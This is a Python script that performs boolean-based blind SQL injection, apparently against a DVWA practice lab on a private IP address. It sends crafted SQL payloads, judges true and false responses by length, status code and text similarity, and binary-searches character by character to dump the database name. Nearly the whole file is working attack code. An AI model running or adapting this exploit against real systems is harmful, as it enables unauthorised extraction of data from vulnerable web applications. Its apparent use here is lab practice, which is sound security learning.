import requests
import difflib
import time

# ===== CONFIG =====
url = "http://172.10.10.134:4280/vulnerabilities/sqli_blind/"
cookies = {
    "security": "low",
    "PHPSESSID": "f8ebefeb528b7e57cc9108813cd6ab5a"
}
params_base = {"Submit": "Submit"}

# ===== REQUEST =====
def send(payload, retries=3):
    for _ in range(retries):
        try:
            r = requests.get(
                url,
                params={**params_base, "id": payload},
                cookies=cookies,
                timeout=5
            )
            return r
        except requests.exceptions.RequestException:
            time.sleep(0.5)
    return None


# ===== SIMILARITY =====
def similarity(a, b):
    return difflib.SequenceMatcher(None, a, b).ratio()


# ===== BASELINE =====
print("[*] Collecting baseline...")

true_res  = send("1' AND 1=1 -- -")
false_res = send("1' AND 1=2 -- -")

true_text  = true_res.text
false_text = false_res.text

true_len  = len(true_text)
false_len = len(false_text)

true_code  = true_res.status_code
false_code = false_res.status_code

print(f"[+] TRUE length: {true_len}, FALSE length: {false_len}")


# ===== BOOLEAN DETECTOR =====
def is_true(payload):
    r = send(payload)
    if not r:
        return False

    text = r.text

    # 1. Length comparison
    len_score = abs(len(text) - true_len) < abs(len(text) - false_len)

    # 2. Status code
    code_score = (r.status_code == true_code)

    # 3. Content similarity
    sim_true  = similarity(text, true_text)
    sim_false = similarity(text, false_text)
    sim_score = sim_true > sim_false

    # Majority voting
    score = sum([len_score, code_score, sim_score])
    return score >= 2


# ===== EXTRACT CHARACTER =====
def get_char(pos):
    low, high = 32, 126

    while low <= high:
        mid = (low + high) // 2

        payload = f"1' AND ASCII(SUBSTRING(database(),{pos},1))>{mid} -- -"

        if is_true(payload):
            low = mid + 1
        else:
            high = mid - 1

    # detect end of string
    if low < 32 or low > 126:
        return None

    return chr(low)


# ===== DUMP DATABASE =====
print("[*] Dumping database name...")

db = ""
for i in range(1, 30):  # max length 30
    c = get_char(i)

    if not c:
        break

    db += c
    print(f"[+] DB so far: {db}")

print(f"\n[✔] Final DB name: {db}")